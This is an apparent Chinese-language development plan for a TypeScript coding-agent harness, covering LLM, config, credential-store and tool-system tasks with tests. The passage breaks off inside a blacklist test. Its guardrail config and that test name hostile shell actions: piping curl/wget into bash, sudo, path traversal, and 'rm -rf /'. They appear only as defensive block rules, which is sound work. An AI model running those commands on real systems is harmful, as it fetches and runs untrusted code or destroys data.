# Coding Agent Harness 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建一个完整的 Coding Agent Harness——从 LLM 抽象层到 CLI 工具，核心机制用确定性代码实现，所有模块用 mock LLM 做单元测试。

**Architecture:** 中间件管道架构。Agent 主循环按固定顺序执行 7 个步骤（上下文组装 → LLM 调用 → 解析 → 护栏 → 工具执行 → 反馈 → 停机判断），每个维度作为独立模块，通过明确接口与主循环交互。

**Tech Stack:** TypeScript, Node.js ≥ 18, Vitest, OpenAI SDK (→ DeepSeek), commander.js, Express

## 全局约束

- Node.js ≥ 18，TypeScript ≥ 5.x
- 包管理器：npm
- 测试框架：Vitest，mock-LLM 单元测试零网络依赖
- 源码目录：`src/`，测试目录：`tests/unit/`
- 每个 task 遵循 TDD：先写失败测试 → 确认红 → 写最小实现 → 确认绿 → 重构 → commit
- Git 分支策略：每个 task 一个 feature branch（`task/N-description`），不用 worktree
- commit 格式：`feat(module): description`，标注 subagent 完成
- 源码不得出现任何硬编码凭据

## Subagent 通用 Prompt 模板

> 以下为每个 task 派发 subagent 时使用的 prompt 模板。使用时将 `[ ]` 中的内容替换为对应 task 的具体信息。

---

```
## 项目信息

工作目录：e:\软件工程师训练营\AI4SE_Final_Project\ai4se-harness
项目类型：TypeScript + Node.js CLI 工具
测试框架：Vitest（`npx vitest run`）
项目 SPEC：SPEC.md（在项目根目录）
项目 PLAN：PLAN.md（在项目根目录，你当前的任务在其中定义）

## 你的任务

Task [N]：[任务名称]

请先阅读 `SPEC.md` 了解项目整体设计，再回到 PLAN.md 阅读你负责的 Task [N] 的完整描述。

## 语言要求

- 与我交流请用中文
- 代码注释请用中文
- 代码标识符（变量名、函数名、类型名）用英文

## 重要约束

1. **只能写代码，不要执行 git 命令**。完成代码后告诉我应该执行哪些 git 命令。
2. **TDD 先行**：先写失败测试 → 运行确认红色 → 再写实现 → 运行确认绿色。
3. **单元测试零网络依赖**：所有测试用 MockLLMProvider（`src/llm/mock.ts`），不连接真实 API。
4. **禁止硬编码凭据**：源码中不能出现任何 API key 字面量。
5. **ESM 模块**：import 使用 `.js` 后缀（如 `import { Tool } from '../core/types.js'`）。
6. **不要修改 task 范围外的文件**：只动 PLAN.md 中你负责的 "Files" 列表里的文件。
7. **不要修改已有的公共接口和类型定义**：如果需要改，先问我。
8. 项目根目录是 `ai4se-harness/`，所有文件路径相对于此。

## PLAN 中代码的作用

PLAN.md 中部分 task 给出了较为完整的代码示例。这些代码**只是参考框架**，帮助你理解预期的结构和接口，**不能直接照抄**。原因：

- 示例代码可能有遗漏（错误处理不完整、边界条件未覆盖等）
- 示例代码可能有设计不合理的地方，需要你独立判断
- 部分接口定义和类型可能已经过时（与 `src/core/types.ts` 中实际定义不一致）

你必须：理解每个 task 要解决的问题，基于 SPEC 和已有的实际代码来编写实现。PLAN 的代码可以做参考，但最终要以你的独立判断为准。

## 测试要求

PLAN 中给出的测试用例是**最低要求**——通常只覆盖了 happy path 的 1-2 个基础 case。你还需要主动补充至少以下边界测试：

- **空输入 / 极端值**：空字符串、null、undefined、超长输入、负数等
- **错误路径**：文件不存在、权限不足、格式错误、网络超时
- **多次调用 / 状态累积**：同一个实例连续调用多次，状态是否正确更新
- **（如适用）并发场景**：同时发出的请求是否互相干扰

我审查时会检查测试是否足够全面，而不仅仅是 PLAN 里列出的那几条是否通过。

## 完成后的输出格式

任务完成后，请按以下格式向我报告：


### Task [N] 完成

**创建的文件**：
- src/xxx/xxx.ts
- tests/unit/xxx.test.ts

**修改的文件**：
- 无 / src/xxx/xxx.ts（说明改了什么）

**测试结果**：
- X/Y 通过
- npx tsc --noEmit：通过 / 失败

**建议的 Git 命令**：
git checkout -b task/[N]-[description]
git add [文件列表]
git commit -m "feat(module): description"

**遇到的问题（如有）**：
- xxx

```

---

### Task 0: 项目脚手架与核心类型

**目的：** 搭建项目基础结构，定义所有模块共享的核心类型，让后续 task 可以独立并行开发。

**依赖：** 无

**分支：** `task/0-project-scaffold`

---

#### Task 0 实现步骤

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `vitest.config.ts`
- Create: `.harnessrc.json`（默认配置模板）
- Create: `src/core/types.ts`
- Create: `tests/unit/.gitkeep`

**Interfaces:**
- Consumes: 无
- Produces: `src/core/types.ts` 导出以下类型，供所有后续 task 使用

---

- [ ] **Step 1: 初始化 package.json**

```bash
cd ai4se-harness
npm init -y
```

编辑 `package.json` 为以下内容：

```json
{
  "name": "ai4se-harness",
  "version": "1.0.0",
  "description": "A coding agent harness — deterministic governance, feedback, and tool orchestration for LLM-powered coding agents.",
  "main": "dist/index.js",
  "bin": {
    "harness": "./dist/cli/index.js"
  },
  "scripts": {
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest",
    "test:unit": "vitest run --dir tests/unit"
  },
  "keywords": ["coding-agent", "harness", "llm", "governance"],
  "author": "",
  "license": "MIT",
  "type": "module"
}
```

- [ ] **Step 2: 安装依赖**

```bash
npm install openai commander
npm install -D typescript vitest @types/node express
npm install -D @types/express
```

- [ ] **Step 3: 创建 tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "lib": ["ES2022"],
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "declaration": true,
    "declarationMap": true,
    "sourceMap": true,
    "resolveJsonModule": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist", "tests"]
}
```

- [ ] **Step 4: 创建 vitest.config.ts**

```typescript
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    include: ['tests/**/*.test.ts'],
  },
});
```

- [ ] **Step 5: 写入核心类型定义**

创建 `src/core/types.ts`：

```typescript
// ============================================================
// Message & LLM 类型
// ============================================================

export type MessageRole = 'system' | 'user' | 'assistant' | 'tool';

export interface Message {
  role: MessageRole;
  content: string;
  toolCallId?: string;
  name?: string;
}

export interface ToolDef {
  name: string;
  description: string;
  parameters: {
    type: 'object';
    properties: Record<string, unknown>;
    required?: string[];
  };
  riskHint?: RiskLevel;
}

export interface ToolCall {
  id: string;
  name: string;
  arguments: Record<string, unknown>;
}

export type FinishReason = 'stop' | 'tool_calls' | 'length' | 'error';

export interface LLMResponse {
  content: string | null;
  toolCalls: ToolCall[];
  finishReason: FinishReason;
  usage: { promptTokens: number; completionTokens: number };
}

// ============================================================
// 工具系统类型
// ============================================================

export interface ExecutionResult {
  toolName: string;
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
}

export interface Tool {
  name: string;
  description: string;
  parameters: {
    type: 'object';
    properties: Record<string, unknown>;
    required?: string[];
  };
  riskHint: RiskLevel;
  execute(args: Record<string, unknown>): Promise<ExecutionResult>;
}

// ============================================================
// 护栏类型（深度维度）
// ============================================================

export type RiskLevel = 'low' | 'medium' | 'high';

export type GuardrailAction = 'deny' | 'confirm';

export interface GuardrailRule {
  tool: string;
  pattern: string;      // 正则表达式字符串
  action: GuardrailAction;
}

export type HITLStatus = 'WAITING' | 'APPROVED' | 'DENIED' | 'TIMEOUT';

export interface HITLRequest {
  id: string;
  toolName: string;
  params: Record<string, unknown>;
  risk: 'medium' | 'high';
  reason: string;
  status: HITLStatus;
  createdAt: number;
  timeoutSeconds: number;
}

export interface ScopeFence {
  workspaceRoot: string;
  allowedHosts: string[];
  maxShellTimeMs: number;
}

// ============================================================
// 记忆类型
// ============================================================

export interface MemoryEntry {
  key: string;
  value: string;
  category: 'project' | 'decision';
  updatedAt: number;
}

export interface DecisionRecord {
  toolName: string;
  commandFingerprint: string;
  action: 'approved' | 'denied';
  timestamp: number;
}

// ============================================================
// 反馈类型
// ============================================================

export type FailureType =
  | 'TEST_FAILURE'
  | 'TYPE_ERROR'
  | 'LINT_ERROR'
  | 'SHELL_ERROR'
  | 'GUARDRAIL_DENY'
  | 'UNKNOWN_FAILURE';

export interface Feedback {
  success: boolean;
  failureType?: FailureType;
  suggestion?: string;
  summary: string;
  rawOutput: string;
}

// ============================================================
// 配置类型
// ============================================================

export interface CheckDef {
  name: string;
  command: string;
  signalPattern: string;
}

export interface HarnessConfig {
  llm: {
    provider: string;
    model: string;
    baseURL: string;
    maxTokens: number;
  };
  guardrails: {
    rules: GuardrailRule[];
    hitlTimeoutSeconds: number;
  };
  scope: ScopeFence;
  memory: {
    maxTokens: number;
    summaryInterval: number;
    contextThreshold: number;
  };
  feedback: {
    autoFix: boolean;
    maxRetries: number;
    checks: CheckDef[];
  };
}

// ============================================================
// Agent 会话状态
// ============================================================

export type AgentPhase = 'idle' | 'running' | 'waiting_hitl' | 'completed' | 'error';

export interface AgentState {
  sessionId: string;
  task: string;
  messages: Message[];
  round: number;
  maxRounds: number;
  hitlQueue: HITLRequest[];
  phase: AgentPhase;
}
```

- [ ] **Step 6: 创建默认 .harnessrc.json**

```json
{
  "llm": {
    "provider": "deepseek",
    "model": "deepseek-chat",
    "baseURL": "https://api.deepseek.com/v1",
    "maxTokens": 4096
  },
  "guardrails": {
    "rules": [
      { "tool": "execute_shell", "pattern": "sudo.*", "action": "confirm" },
      { "tool": "execute_shell", "pattern": "(curl|wget).*\\|.*(bash|sh)", "action": "deny" },
      { "tool": "write_file", "pattern": "\\.\\.\\/", "action": "confirm" },
      { "tool": "write_file", "pattern": "^\\/(etc|var|tmp)\\/", "action": "confirm" }
    ],
    "hitlTimeoutSeconds": 60
  },
  "scope": {
    "workspaceRoot": ".",
    "allowedHosts": ["github.com"],
    "maxShellTimeMs": 30000
  },
  "memory": {
    "maxTokens": 2000,
    "summaryInterval": 10,
    "contextThreshold": 0.8
  },
  "feedback": {
    "autoFix": true,
    "maxRetries": 3,
    "checks": [
      { "name": "typecheck", "command": "npx tsc --noEmit", "signalPattern": "error TS" },
      { "name": "lint", "command": "npx eslint --format compact", "signalPattern": "error\\b|warning\\b" },
      { "name": "test", "command": "npm test", "signalPattern": "FAIL|passing" }
    ]
  }
}
```

- [ ] **Step 7: 验证——编译通过**

```bash
npx tsc --noEmit
```

预期输出：无错误，`src/core/types.ts` 类型检查通过。

- [ ] **Step 8: 创建初始目录结构**

```bash
mkdir -p src/core src/llm src/tools/builtin src/guardrails src/memory src/feedback src/config src/credentials src/cli src/web
mkdir -p tests/unit
```

- [ ] **Step 9: Commit**

```bash
git checkout -b task/0-project-scaffold
git add .
git commit -m "feat(scaffold): initialize project with core types and config template"
```

---

### Task 1: LLM 抽象层

**目的：** 实现 `LLMProvider` 接口、`DeepSeekProvider`（真实）和 `MockLLMProvider`（测试用）。这是 A.4-A 的硬性要求——必须有一个可注入 mock 的 LLM 抽象层。

**依赖：** Task 0（核心类型）

**分支：** `task/1-llm-abstraction`

**Files:**
- Create: `src/llm/provider.ts` — `LLMProvider` 接口
- Create: `src/llm/deepseek.ts` — `DeepSeekProvider` 实现
- Create: `src/llm/mock.ts` — `MockLLMProvider` 实现
- Create: `tests/unit/llm.test.ts`

**Interfaces:**
- Consumes: `Message`, `ToolDef`, `LLMResponse` from `src/core/types.ts`
- Produces:
  - `LLMProvider` 接口: `complete(messages: Message[], tools: ToolDef[]): Promise<LLMResponse>`
  - `DeepSeekProvider` 类: constructor takes `{ apiKey: string, model?: string, baseURL?: string }`
  - `MockLLMProvider` 类: constructor takes `Response[]`, property `history: Array<{messages: Message[], tools: ToolDef[]}>`

---

#### Task 1 实现步骤

- [ ] **Step 1: 写失败测试——MockLLMProvider 按顺序弹出预设响应**

创建 `tests/unit/llm.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { MockLLMProvider } from '../../src/llm/mock.js';
import { LLMResponse } from '../../src/core/types.js';

describe('MockLLMProvider', () => {
  it('returns preset responses in order', async () => {
    const responses: LLMResponse[] = [
      {
        content: null,
        toolCalls: [{ id: '1', name: 'read_file', arguments: { path: 'src/index.ts' } }],
        finishReason: 'tool_calls',
        usage: { promptTokens: 100, completionTokens: 50 },
      },
      {
        content: 'Task completed.',
        toolCalls: [],
        finishReason: 'stop',
        usage: { promptTokens: 200, completionTokens: 30 },
      },
    ];

    const mock = new MockLLMProvider(responses);

    const r1 = await mock.complete([{ role: 'user', content: 'read src/index.ts' }], []);
    expect(r1.finishReason).toBe('tool_calls');
    expect(r1.toolCalls[0].name).toBe('read_file');

    const r2 = await mock.complete([{ role: 'user', content: 'done?' }], []);
    expect(r2.finishReason).toBe('stop');
    expect(r2.content).toBe('Task completed.');
  });

  it('records all calls in history', async () => {
    const mock = new MockLLMProvider([
      { content: 'ok', toolCalls: [], finishReason: 'stop', usage: { promptTokens: 10, completionTokens: 5 } },
    ]);

    await mock.complete([{ role: 'user', content: 'hello' }], [{ name: 'read_file', description: '', parameters: { type: 'object', properties: {} } }]);

    expect(mock.history.length).toBe(1);
    expect(mock.history[0].messages[0].content).toBe('hello');
    expect(mock.history[0].tools[0].name).toBe('read_file');
  });

  it('supports error injection', async () => {
    const mock = new MockLLMProvider([
      { content: null, toolCalls: [], finishReason: 'error', usage: { promptTokens: 0, completionTokens: 0 } },
    ]);

    const r = await mock.complete([], []);
    expect(r.finishReason).toBe('error');
  });
});
```

- [ ] **Step 2: 运行测试确认失败（红）**

```bash
npx vitest run tests/unit/llm.test.ts
```

预期：全部 3 个测试失败（模块未创建）

- [ ] **Step 3: 实现 LLMProvider 接口**

创建 `src/llm/provider.ts`：

```typescript
import type { Message, ToolDef, LLMResponse } from '../core/types.js';

export interface LLMProvider {
  complete(messages: Message[], tools: ToolDef[]): Promise<LLMResponse>;
}
```

- [ ] **Step 4: 实现 MockLLMProvider**

创建 `src/llm/mock.ts`：

```typescript
import type { LLMProvider } from './provider.js';
import type { Message, ToolDef, LLMResponse } from '../core/types.js';

export class MockLLMProvider implements LLMProvider {
  private responseQueue: LLMResponse[];
  history: Array<{ messages: Message[]; tools: ToolDef[] }> = [];

  constructor(responses: LLMResponse[]) {
    this.responseQueue = [...responses];
  }

  async complete(messages: Message[], tools: ToolDef[]): Promise<LLMResponse> {
    this.history.push({ messages: [...messages], tools: [...tools] });

    if (this.responseQueue.length === 0) {
      return {
        content: 'No more mock responses.',
        toolCalls: [],
        finishReason: 'stop',
        usage: { promptTokens: 0, completionTokens: 0 },
      };
    }

    return this.responseQueue.shift()!;
  }

  /** 注入错误模式的便捷方法 */
  static error(): MockLLMProvider {
    return new MockLLMProvider([
      {
        content: null,
        toolCalls: [],
        finishReason: 'error',
        usage: { promptTokens: 0, completionTokens: 0 },
      },
    ]);
  }
}
```

- [ ] **Step 5: 实现 DeepSeekProvider（骨架，不在此 task 测试真实网络调用）**

创建 `src/llm/deepseek.ts`：

```typescript
import type { LLMProvider } from './provider.js';
import type { Message, ToolDef, ToolCall, LLMResponse, FinishReason } from '../core/types.js';
import OpenAI from 'openai';

export interface DeepSeekOptions {
  apiKey: string;
  model?: string;
  baseURL?: string;
  maxTokens?: number;
}

export class DeepSeekProvider implements LLMProvider {
  private client: OpenAI;
  private model: string;
  private maxTokens: number;

  constructor(options: DeepSeekOptions) {
    this.client = new OpenAI({
      apiKey: options.apiKey,
      baseURL: options.baseURL ?? 'https://api.deepseek.com/v1',
    });
    this.model = options.model ?? 'deepseek-chat';
    this.maxTokens = options.maxTokens ?? 4096;
  }

  async complete(messages: Message[], tools: ToolDef[]): Promise<LLMResponse> {
    try {
      const response = await this.client.chat.completions.create({
        model: this.model,
        messages: messages as OpenAI.Chat.ChatCompletionMessageParam[],
        tools: tools.length > 0 ? tools.map(t => ({
          type: 'function' as const,
          function: {
            name: t.name,
            description: t.description,
            parameters: t.parameters,
          },
        })) : undefined,
        max_tokens: this.maxTokens,
      });

      const choice = response.choices[0];
      const message = choice.message;

      const toolCalls: ToolCall[] = (message.tool_calls ?? []).map(tc => ({
        id: tc.id,
        name: tc.function.name,
        arguments: JSON.parse(tc.function.arguments),
      }));

      const finishReasonMap: Record<string, FinishReason> = {
        stop: 'stop',
        tool_calls: 'tool_calls',
        length: 'length',
      };

      return {
        content: message.content,
        toolCalls,
        finishReason: finishReasonMap[choice.finish_reason] ?? 'stop',
        usage: {
          promptTokens: response.usage?.prompt_tokens ?? 0,
          completionTokens: response.usage?.completion_tokens ?? 0,
        },
      };
    } catch (error) {
      return {
        content: null,
        toolCalls: [],
        finishReason: 'error',
        usage: { promptTokens: 0, completionTokens: 0 },
      };
    }
  }
}
```

- [ ] **Step 6: 运行测试确认通过（绿）**

```bash
npx vitest run tests/unit/llm.test.ts
```

预期：3/3 测试通过

- [ ] **Step 7: Commit**

```bash
git checkout -b task/1-llm-abstraction
git add src/llm/ tests/unit/llm.test.ts
git commit -m "feat(llm): add LLMProvider interface, DeepSeekProvider, and MockLLMProvider"
```

---

### Task 2: 配置加载器

**目的：** 实现 `ConfigLoader` —— 读取 `.harnessrc.json`、校验合法性、合并默认值。

**依赖：** Task 0（核心类型）

**分支：** `task/2-config-loader`

**Files:**
- Create: `src/config/loader.ts`
- Create: `tests/unit/config.test.ts`

**Interfaces:**
- Consumes: `HarnessConfig`, `GuardrailRule`, `CheckDef`, `ScopeFence` from `src/core/types.ts`
- Produces:
  - `ConfigLoader` 类: `static load(filePath?: string): HarnessConfig`
  - `ConfigLoader.DEFAULTS: HarnessConfig`（静态默认配置）
  - 加载失败时抛出 `ConfigError`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/config.test.ts`：

```typescript
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { ConfigLoader } from '../../src/config/loader.js';
import { HarnessConfig } from '../../src/core/types.js';
import { writeFileSync, unlinkSync, mkdirSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('ConfigLoader', () => {
  const tmpDir = join(tmpdir(), 'harness-config-test');
  const tmpConfig = join(tmpDir, '.harnessrc.json');

  beforeEach(() => {
    mkdirSync(tmpDir, { recursive: true });
  });

  afterEach(() => {
    try { unlinkSync(tmpConfig); } catch {}
  });

  it('returns defaults when no config file exists', () => {
    const config = ConfigLoader.load('/nonexistent/path/.harnessrc.json');
    expect(config.llm.provider).toBe('deepseek');
    expect(config.llm.model).toBe('deepseek-chat');
    expect(config.guardrails.hitlTimeoutSeconds).toBe(60);
    expect(config.scope.workspaceRoot).toBe('.');
    expect(config.memory.maxTokens).toBe(2000);
  });

  it('loads and merges partial config with defaults', () => {
    const partial = JSON.stringify({ llm: { model: 'deepseek-v3' } });
    writeFileSync(tmpConfig, partial);

    const config = ConfigLoader.load(tmpConfig);
    expect(config.llm.model).toBe('deepseek-v3');
    expect(config.llm.provider).toBe('deepseek'); // default merged
    expect(config.guardrails.hitlTimeoutSeconds).toBe(60); // default merged
  });

  it('throws ConfigError for invalid regex in guardrail rule', () => {
    const badConfig = JSON.stringify({
      guardrails: { rules: [{ tool: 'execute_shell', pattern: '[invalid', action: 'deny' }] },
    });
    writeFileSync(tmpConfig, badConfig);

    expect(() => ConfigLoader.load(tmpConfig)).toThrow(/Invalid guardrail rule/);
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/config.test.ts
```

- [ ] **Step 3: 实现 ConfigLoader**

创建 `src/config/loader.ts`：

```typescript
import { readFileSync } from 'fs';
import type { HarnessConfig, GuardrailRule } from '../core/types.js';

export class ConfigError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'ConfigError';
  }
}

export class ConfigLoader {
  static DEFAULTS: HarnessConfig = {
    llm: {
      provider: 'deepseek',
      model: 'deepseek-chat',
      baseURL: 'https://api.deepseek.com/v1',
      maxTokens: 4096,
    },
    guardrails: {
      rules: [],
      hitlTimeoutSeconds: 60,
    },
    scope: {
      workspaceRoot: '.',
      allowedHosts: ['github.com'],
      maxShellTimeMs: 30000,
    },
    memory: {
      maxTokens: 2000,
      summaryInterval: 10,
      contextThreshold: 0.8,
    },
    feedback: {
      autoFix: true,
      maxRetries: 3,
      checks: [],
    },
  };

  static load(filePath: string = './.harnessrc.json'): HarnessConfig {
    let userConfig: Partial<HarnessConfig> = {};

    try {
      const raw = readFileSync(filePath, 'utf-8');
      userConfig = JSON.parse(raw);
    } catch {
      // 文件不存在或无法解析→使用默认值
    }

    const merged = ConfigLoader.deepMerge(ConfigLoader.DEFAULTS, userConfig) as HarnessConfig;

    // 校验护栏规则的正则表达式
    for (const rule of merged.guardrails.rules) {
      try {
        new RegExp(rule.pattern);
      } catch {
        throw new ConfigError(`Invalid guardrail rule: pattern "${rule.pattern}" is not a valid regex`);
      }
    }

    // 校验数值字段
    if (merged.guardrails.hitlTimeoutSeconds <= 0) {
      throw new ConfigError('hitlTimeoutSeconds must be positive');
    }
    if (merged.memory.maxTokens <= 0) {
      throw new ConfigError('memory.maxTokens must be positive');
    }
    if (merged.llm.maxTokens <= 0) {
      throw new ConfigError('llm.maxTokens must be positive');
    }

    return merged;
  }

  private static deepMerge(target: Record<string, unknown>, source: Partial<Record<string, unknown>>): Record<string, unknown> {
    const result = { ...target };
    for (const key of Object.keys(source)) {
      if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
        result[key] = ConfigLoader.deepMerge(
          (target[key] as Record<string, unknown>) ?? {},
          source[key] as Record<string, unknown>,
        );
      } else {
        result[key] = source[key];
      }
    }
    return result;
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/config.test.ts
```

预期：3/3 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/2-config-loader
git add src/config/ tests/unit/config.test.ts
git commit -m "feat(config): add ConfigLoader with validation and defaults"
```

---

### Task 3: 凭据存储

**目的：** 实现 `CredentialStore`——PBKDF2 密钥派生 + AES-256-GCM 加解密 API key。

**依赖：** Task 0（核心类型，仅用基础类型）

**分支：** `task/3-credential-store`

**Files:**
- Create: `src/credentials/store.ts`
- Create: `tests/unit/credentials.test.ts`

**Interfaces:**
- Consumes: 无（仅依赖 Node.js `crypto` 模块）
- Produces:
  - `CredentialStore.save(apiKey: string, masterPassword: string, filePath?: string): Promise<void>`
  - `CredentialStore.load(masterPassword: string, filePath?: string): Promise<string>` — 返回解密后的 apiKey
  - `CredentialStore.delete(filePath?: string): Promise<void>`
  - `CredentialStore.exists(filePath?: string): boolean`
  - 错误密码抛出 `CredentialError`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/credentials.test.ts`：

```typescript
import { describe, it, expect, afterEach } from 'vitest';
import { CredentialStore } from '../../src/credentials/store.js';
import { unlinkSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('CredentialStore', () => {
  const testFile = join(tmpdir(), 'test-credentials.enc');

  afterEach(() => {
    try { unlinkSync(testFile); } catch {}
  });

  it('encrypts and decrypts an API key', async () => {
    await CredentialStore.save('sk-test-key-12345', 'my-master-pw', testFile);

    const key = await CredentialStore.load('my-master-pw', testFile);
    expect(key).toBe('sk-test-key-12345');
  });

  it('throws on wrong master password', async () => {
    await CredentialStore.save('sk-test-key-12345', 'correct-pw', testFile);

    await expect(CredentialStore.load('wrong-pw', testFile)).rejects.toThrow(/credential/i);
  });

  it('detects existence of credential file', async () => {
    expect(CredentialStore.exists(testFile)).toBe(false);

    await CredentialStore.save('sk-abc', 'pw', testFile);
    expect(CredentialStore.exists(testFile)).toBe(true);
  });

  it('deletes credential file', async () => {
    await CredentialStore.save('sk-abc', 'pw', testFile);
    expect(CredentialStore.exists(testFile)).toBe(true);

    await CredentialStore.delete(testFile);
    expect(CredentialStore.exists(testFile)).toBe(false);
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/credentials.test.ts
```

- [ ] **Step 3: 实现 CredentialStore**

创建 `src/credentials/store.ts`：

```typescript
import {
  randomBytes,
  createCipheriv,
  createDecipheriv,
  pbkdf2Sync,
} from 'crypto';
import { readFileSync, writeFileSync, unlinkSync, existsSync } from 'fs';

const ALGORITHM = 'aes-256-gcm';
const PBKDF2_ITERATIONS = 100_000;
const KEY_LENGTH = 32;
const IV_LENGTH = 16;
const SALT_LENGTH = 32;
const AUTH_TAG_LENGTH = 16;

interface CredentialFile {
  encryptedKey: string; // base64
  iv: string;           // base64
  salt: string;         // base64
  authTag: string;      // base64
}

export class CredentialError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'CredentialError';
  }
}

export class CredentialStore {
  static defaultPath(): string {
    const home = process.env.HOME ?? process.env.USERPROFILE ?? '.';
    return `${home}/.ai4se-harness/credentials.enc`;
  }

  static exists(filePath?: string): boolean {
    return existsSync(filePath ?? CredentialStore.defaultPath());
  }

  static async save(apiKey: string, masterPassword: string, filePath?: string): Promise<void> {
    const salt = randomBytes(SALT_LENGTH);
    const iv = randomBytes(IV_LENGTH);
    const key = pbkdf2Sync(masterPassword, salt, PBKDF2_ITERATIONS, KEY_LENGTH, 'sha512');

    const cipher = createCipheriv(ALGORITHM, key, iv);
    const encrypted = Buffer.concat([cipher.update(apiKey, 'utf-8'), cipher.final()]);
    const authTag = cipher.getAuthTag();

    const data: CredentialFile = {
      encryptedKey: encrypted.toString('base64'),
      iv: iv.toString('base64'),
      salt: salt.toString('base64'),
      authTag: authTag.toString('base64'),
    };

    const targetPath = filePath ?? CredentialStore.defaultPath();
    const dir = targetPath.substring(0, targetPath.lastIndexOf('/'));
    // 确保目录存在——简化起见，使用 fs 同步方式
    const { mkdirSync } = await import('fs');
    mkdirSync(dir, { recursive: true });

    writeFileSync(targetPath, JSON.stringify(data, null, 2), 'utf-8');
  }

  static async load(masterPassword: string, filePath?: string): Promise<string> {
    const targetPath = filePath ?? CredentialStore.defaultPath();

    let data: CredentialFile;
    try {
      const raw = readFileSync(targetPath, 'utf-8');
      data = JSON.parse(raw);
    } catch {
      throw new CredentialError('Cannot read credential file. Run "harness setup" first.');
    }

    const salt = Buffer.from(data.salt, 'base64');
    const iv = Buffer.from(data.iv, 'base64');
    const authTag = Buffer.from(data.authTag, 'base64');
    const encryptedKey = Buffer.from(data.encryptedKey, 'base64');

    const key = pbkdf2Sync(masterPassword, salt, PBKDF2_ITERATIONS, KEY_LENGTH, 'sha512');

    const decipher = createDecipheriv(ALGORITHM, key, iv);
    decipher.setAuthTag(authTag);

    try {
      const decrypted = Buffer.concat([decipher.update(encryptedKey), decipher.final()]);
      return decrypted.toString('utf-8');
    } catch {
      throw new CredentialError('Incorrect master password.');
    }
  }

  static async delete(filePath?: string): Promise<void> {
    const targetPath = filePath ?? CredentialStore.defaultPath();
    if (existsSync(targetPath)) {
      unlinkSync(targetPath);
    }
  }
}
```

> **注意：** Step 3 的 `save` 方法中 `mkdirSync` 的 import 方式不优雅。实现时请直接 import `{ mkdirSync } from 'fs'`，在文件顶部统一 import。

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/credentials.test.ts
```

预期：4/4 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/3-credential-store
git add src/credentials/ tests/unit/credentials.test.ts
git commit -m "feat(credentials): add CredentialStore with PBKDF2 + AES-256-GCM"
```

---

### Task 4: 工具系统（接口 + 注册 + 分发 + 黑名单）

**目的：** 实现工具注册表、分发器、参数校验和硬黑名单。5 个内置工具在下一 task 实现。

**依赖：** Task 0（核心类型）

**分支：** `task/4-tool-system`

**Files:**
- Create: `src/tools/registry.ts`
- Create: `src/tools/dispatcher.ts`
- Create: `src/tools/blacklist.ts`
- Create: `tests/unit/tools.test.ts`

**Interfaces:**
- Consumes: `Tool`, `ToolCall`, `ExecutionResult`, `RiskLevel`, `GuardrailAction` from `src/core/types.ts`
- Produces:
  - `ToolRegistry` 类: `register(tool: Tool): void`, `get(name: string): Tool | undefined`, `list(): Tool[]`, `toToolDefs(): ToolDef[]`
  - `ToolDispatcher.dispatch(call: ToolCall, registry: ToolRegistry): Promise<ExecutionResult>`
  - `Blacklist.check(command: string): boolean` — 命中返回 true
  - `Blacklist.REASON`: string

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/tools.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { ToolRegistry } from '../../src/tools/registry.js';
import { ToolDispatcher } from '../../src/tools/dispatcher.js';
import { Blacklist } from '../../src/tools/blacklist.js';
import { Tool, ExecutionResult } from '../../src/core/types.js';

const mockTool: Tool = {
  name: 'echo',
  description: 'echo back input',
  parameters: {
    type: 'object',
    properties: { message: { type: 'string' } },
    required: ['message'],
  },
  riskHint: 'low',
  execute: async (args) => ({
    toolName: 'echo',
    success: true,
    stdout: String(args.message),
    stderr: '',
    exitCode: 0,
  }),
};

describe('ToolRegistry', () => {
  it('registers and retrieves a tool', () => {
    const registry = new ToolRegistry();
    registry.register(mockTool);

    expect(registry.get('echo')).toBe(mockTool);
    expect(registry.list()).toHaveLength(1);
  });

  it('generates ToolDef for LLM', () => {
    const registry = new ToolRegistry();
    registry.register(mockTool);

    const defs = registry.toToolDefs();
    expect(defs[0].name).toBe('echo');
    expect(defs[0].parameters).toEqual(mockTool.parameters);
  });
});

describe('ToolDispatcher', () => {
  it('dispatches a tool call and returns execution result', async () => {
    const registry = new ToolRegistry();
    registry.register(mockTool);

    const result = await ToolDispatcher.dispatch(
      { id: '1', name: 'echo', arguments: { message: 'hello' } },
      registry,
    );

    expect(result.success).toBe(true);
    expect(result.stdout).toBe('hello');
  });

  it('rejects invalid parameters against JSON Schema', async () => {
    const registry = new ToolRegistry();
    registry.register(mockTool);

    const result = await ToolDispatcher.dispatch(
      { id: '1', name: 'echo', arguments: { message: 42 } }, // should be string
      registry,
    );

    expect(result.success).toBe(false);
    expect(result.stderr).toContain('parameter');
  });
});

describe('Blacklist', () => {
  it('blocks rm -rf /', () => {
